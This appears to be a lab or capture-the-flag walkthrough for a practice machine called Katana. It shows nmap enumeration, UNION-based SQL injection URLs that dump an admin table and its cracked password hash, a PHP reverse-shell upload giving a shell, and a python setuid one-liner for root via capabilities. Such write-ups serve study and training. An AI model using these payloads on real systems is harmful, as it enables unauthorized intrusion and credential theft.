# Katana
## Information Gathering
#### Ports/Services
x 21/tcp     ftp           
x 22/tcp     ssh           
80/tcp     http          
7080/tcp   ssl/empowerid 
8088/tcp   http          
8715/tcp   http


## Enumeration
### Nmap scan
```bash
PORT     STATE SERVICE       REASON         VERSION
21/tcp   open  ftp           syn-ack ttl 63 vsftpd 3.0.3
22/tcp   open  ssh           syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 89:4f:3a:54:01:f8:dc:b6:6e:e0:78:fc:60:a6:de:35 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDp0J8d7K55SuQO/Uuh8GyKm2xlwCUG3/Jb6+7RlfgbwrCIOzuKXICcMHq4i8z52l/0x0JnN0GUIeNu6Ek/ZGEMK4y+zvAs0R6oPNlScpx0IaLDXTGrjPOcutmx+fy6WDW3/jJGLxwu+55d6pAjzzQR37P1eqH8k9F6fbv6YUFbU+i68x9p5bXCC1m17PDO98Che+q32N6yM26CrQMOl5t1OzO3t1pbvMd3VOQA8Qd+fhz5tpxtRBTSM9ylQj2B+z6XjJnbMPhnO3C1oaYHjjL6KiTfD5YabDqsBf+ZHIdZpM+7fOqKkgHa4bbIWPUXB/OuOJnORvEeRCALOzjcSrxr
|   256 dd:ac:cc:4e:43:81:6b:e3:2d:f3:12:a1:3e:4b:a3:22 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDBsZi0z31ChZ3SWO/gDe+8WyFVPrFX7KgZNp8u/1vlhOSrmdZ32WAZZhTT8bblwgv83FeXPvH7btjDMzTuoYA8=
|   256 cc:e6:25:c0:c6:11:9f:88:f6:c4:26:1e:de:fa:e9:8b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICo+dAzFw2csa366udGUkSre2W0qWWGoyWXwKiHk3YQc
80/tcp   open  http          syn-ack ttl 63 Apache httpd 2.4.38 ((Debian))
|_http-title: Katana X
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.38 (Debian)
7080/tcp open  ssl/empowerid syn-ack ttl 63 LiteSpeed
|_http-title: Did not follow redirect to https://192.168.78.83:7080/
| http-methods: 
|_  Supported Methods: GET HEAD POST
| ssl-cert: Subject: commonName=katana/organizationName=webadmin/countryName=US/X509v3 Subject Alternative Name=DNS.1=1.55.254.232
| Issuer: commonName=katana/organizationName=webadmin/countryName=US/X509v3 Subject Alternative Name=DNS.1=1.55.254.232
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-11T13:57:36
| Not valid after:  2022-05-11T13:57:36
| MD5:   0443 4a65 9ba1 0b75 ea8d d1b8 c855 e495
| SHA-1: f89e f85e e6b3 6b10 4ebc 5354 80a0 0ae3 7e10 50cc
| -----BEGIN CERTIFICATE-----
| MIIDfTCCAmWgAwIBAgIUAXyRP1qy58OWLRWfP6CNoErg93wwDQYJKoZIhvcNAQEL
| BQAwTjEPMA0GA1UEAwwGa2F0YW5hMREwDwYDVQQKDAh3ZWJhZG1pbjELMAkGA1UE
| BhMCVVMxGzAZBgNVHREMEkROUy4xPTEuNTUuMjU0LjIzMjAeFw0yMDA1MTExMzU3
| MzZaFw0yMjA1MTExMzU3MzZaME4xDzANBgNVBAMMBmthdGFuYTERMA8GA1UECgwI
| d2ViYWRtaW4xCzAJBgNVBAYTAlVTMRswGQYDVR0RDBJETlMuMT0xLjU1LjI1NC4y
| MzIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDUrg/knoyr6L8pJhlZ
| bEp2vj/1S/2lEiYzl3CbBtCDcNnSQLB2b7hC5vkzIFT5XOHcboXGSWWZ7g1Mlo/U
| irtoeuFYH0KyqYqKH6cJIUCUuIvsKFvEuSpcLB5oHMH1bNYHl8gk2uxnXDRHfxL1
| mhhV+tDewjGu7TzjWcGapvZmJKCQYJto6X4JagN/Xx7bWZQYKb22E/K/17PPg1Wg
| szg2C8a/sj/GWBiw5HADUx5FnQY0FfljwBBSQr10nGiex+w/NAYK8obUTsvUz1P7
| h2aG1V/9FtXHa6HK7YrApieVVTyBZTf4adj5OvmIT5w43vEBZXgCTUMLcf6JmiGy
| OMmdAgMBAAGjUzBRMB0GA1UdDgQWBBRpfqzDB3dS6IMabVgYjX+nQE8xZzAfBgNV
| HSMEGDAWgBRpfqzDB3dS6IMabVgYjX+nQE8xZzAPBgNVHRMBAf8EBTADAQH/MA0G
| CSqGSIb3DQEBCwUAA4IBAQCGCOYvcHj7XrE0fnuDbc4rdQzSVOCOK31F4aV4pWEh
| a6h/WQX9wQBHcs5XPl9D4JVDFQvtxBPWsmnzqqXm8CbeZ7cfAjzPGd994jFBeom6
| 3gnAXmCFSlRsPuqvKkGhBaSDDtzrWE4eZC0H2g9BJp0f6w4sRJSjCH1wZ30Jvgm+
| 9Hkcw9cG0WxkHEBk3SPB7d9iG6rFLJvZE4dcVbA6jtkhQZDrCAqaH69exWtKSQpV
| oBu7+tHFy/8uv7yRuC4fQY7Nmc0JD5otoax1yOpGN/eSz8zRFh+jl5VzdONtXQCO
| H8o8x5fxVi65kRQYil6UcG3lX56V51h/33dxWIDw+lAE
|_-----END CERTIFICATE-----
| tls-alpn: 
|   h2
|   spdy/3
|   spdy/2
|_  http/1.1
|_http-server-header: LiteSpeed
|_ssl-date: TLS randomness does not represent time
8088/tcp open  http          syn-ack ttl 63 LiteSpeed httpd
|_http-title: Katana X
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: LiteSpeed
8715/tcp open  http          syn-ack ttl 63 nginx 1.14.2
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Restricted Content
|_http-title: 401 Authorization Required
|_http-server-header: nginx/1.14.2
```


### 21/tcp
- vsftpd 3.0.3


### 22/tcp
- OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
- ssh-auth-methods
	- public key
	- password
	- keyboard-interactive

### 80/tcp
- Apache 2.4.38

`http://192.168.78.83/ebook/bookPerPub.php?pubid=1`
*** 
- Interesting parameter `pubid`


`http://192.168.78.83/ebook/book.php?bookisbn=978-0-321-94786-4`
***
- Interesting parameter `bookisbn`
- Fuzzing for SQLi
```bash
wfuzz -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt --hh 10 "http://192.168.78.83/ebook/book.php?bookisbn=FUZZ"
```
- The URL `http://192.168.78.83/ebook/book.php?bookisbn=)%20or%20(%27x%27=%27x` returns an error message `Can't retrieve data You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'x'='x'' at line 1`

- Determined number of columns - `http://192.168.78.83/ebook/book.php?bookisbn=1%27%20UNION%20SELECT%201,2,3,4,5,6,7--%20-`
- Dumping table names - `http://192.168.78.83/ebook/book.php?bookisbn=1%27%20UNION%20SELECT%20group_concat(table_name),2,3,4,5,6,7%20from%20information_schema.tables--%20-`

- `admin` table
	- Dumping columns - `http://192.168.78.83/ebook/book.php?bookisbn=1%27%20UNION%20SELECT%20group_concat(column_name),2,3,4,5,6,7%20from%20information_schema.columns%20where%20table_name=%27admin%27--%20-` 
		- `name`
		- `pass`
	- Displaying columns `name` and `pass`  - `http://192.168.78.83/ebook/book.php?bookisbn=1%27%20UNION%20SELECT%20group_concat(name),2,group_concat(pass),4,5,6,7%20from%20admin--%20-`
		- `admin:d033e22ae348aeb5660fc2140aec35850c4da997` - cracked hash
			- `admin:admin`

- `customers` table
	- Dumping columns - `http://192.168.78.83/ebook/book.php?bookisbn=1' UNION SELECT group_concat(column_name),2,3,4,5,6,7 from information_schema.columns where table_name='customers'-- -`




- Logged in
	- Attempt to upload file - `http://192.168.78.83/ebook/admin_edit.php?bookisbn=978-1-484217-26-9` - FAILED

`http://192.168.78.83/ebook/admin.php`
***
- Interesting POST parameters
	- `name`
	- `pass`
	- `submit`


### 7080/tcp
- LiteSpeed Web Server 1.5

- Live pages are few, everything that doesn't exist is 403 - `https://192.168.78.83:7080/docs/`
- Just documentation


### 8088/tcp
- LiteSpeed Web Server
- PHP Version 5.6.36

- Directory busting
```
192.168.78.83:8088/
192.168.78.83:8088/blocked => 192.168.78.83:8088/blocked/
192.168.78.83:8088/cgi-bin => 192.168.78.83:8088/cgi-bin/
192.168.78.83:8088/css => 192.168.78.83:8088/css/
192.168.78.83:8088/docs => 192.168.78.83:8088/docs/
192.168.78.83:8088/error404.html
192.168.78.83:8088/img => 192.168.78.83:8088/img/
192.168.78.83:8088/index.html
192.168.78.83:8088/phpinfo.php
192.168.78.83:8088/protected => 192.168.78.83:8088/protected/
192.168.78.83:8088/upload.php
192.168.78.83:8088/upload.html
```

- Interesting directories
	- `blocked` - 403
		- Dirbustered this and got nothing back
	- `protected` - 401
		- Perform dictattack using `medusa`
	- `upload.php`
	- `upload.html`
		- Looks like I can upload files from two different spots
		- I upload a `php-reverse-shell.php` into both spots. The application tells me the name of the file uploaded `Moved to other web server: /tmp/php012FFx ====> /opt/manager/html/katana_php-reverse-shell.php`
		- Trying other webservers gives reverse shell - `http://192.168.78.83:8715/katana_php-reverse-shell.php`

### 8715/tcp
- All uploaded files are uploaded to this webserver


## Exploitation
- Upload a reverse shell to `http://192.168.78.83:8088/upload.html` in the second `Browse` field
- Navigate to `http://192.168.78.83:8715/katana_php-reverse-shell.php` and catch a reverse shell

## Privilege Escalation
- `python2.7` has `cap_setuid+ep` set
- Performing the following drops you into a root shell
```bash
python -c 'import os; os.setuid(0); os.system("/bin/sh")'
```